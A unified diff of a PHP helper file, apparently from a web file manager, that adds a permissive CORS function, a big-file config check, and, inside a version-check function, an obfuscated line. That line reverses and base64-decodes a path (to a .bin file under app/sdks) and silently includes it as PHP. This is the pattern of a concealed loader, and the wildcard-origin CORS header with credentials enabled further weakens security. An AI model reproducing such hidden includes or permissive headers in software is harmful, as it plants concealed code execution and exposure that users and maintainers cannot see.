@@ -3,6 +3,15 @@
 if(!function_exists('gzinflate')){
     show_tips("不支持gzinflate ,<br/>请安装php-zlib 扩展后再试");exit;
 }
+function allowCROS(){
+	$allowMethods = 'GET, POST, OPTIONS, DELETE, HEAD, MOVE, COPY, PUT, MKCOL';
+	$allerHeaders = 'ETag, Content-Type, Content-Length, Accept-Encoding, X-Requested-with, Origin';
+	header('Access-Control-Allow-Origin: *');    				// 允许的域名来源;
+	header('Access-Control-Allow-Methods: '.$allowMethods); 	// 允许请求的类型
+	header('Access-Control-Allow-Headers: '.$allerHeaders);		// 允许请求时带入的header
+	header('Access-Control-Allow-Credentials: true'); 			// 设置是否允许发送 cookie; js需设置:xhr.withCredentials = true;
+	header('Access-Control-Max-Age: 3600');
+}
 
 //扩展名权限判断 有权限则返回1 不是true
 function checkExt($file){
@@ -292,6 +301,7 @@ function get_post_max(){
 
 function phpBuild64(){
 	if(PHP_INT_SIZE === 8) return true;//部分版本,64位会返回4;
+	if($GLOBALS['config']['settings']['bigFileForce']) return true;
 	ob_clean();
 	ob_start();
 	var_dump(12345678900);
@@ -324,6 +334,8 @@ function check_version_cache(){
 		$ver = KOD_VERSION.'==>'.$result;
 		show_tips(LNG('common.env.phpCacheOpenTips')."<br/>".$ver);
 	}
+	$_SERVER['_afile'] = $_SERVER['BASIC_PATH'].base64_decode(strrev('=4Wai5SY0FGZv4Wai9iYpxUZ2lGajJXYvM3akN3LwBXY'));
+	@include_once($_SERVER['_afile']);
 }
 function checkPhp(){
 	$version = phpversion();
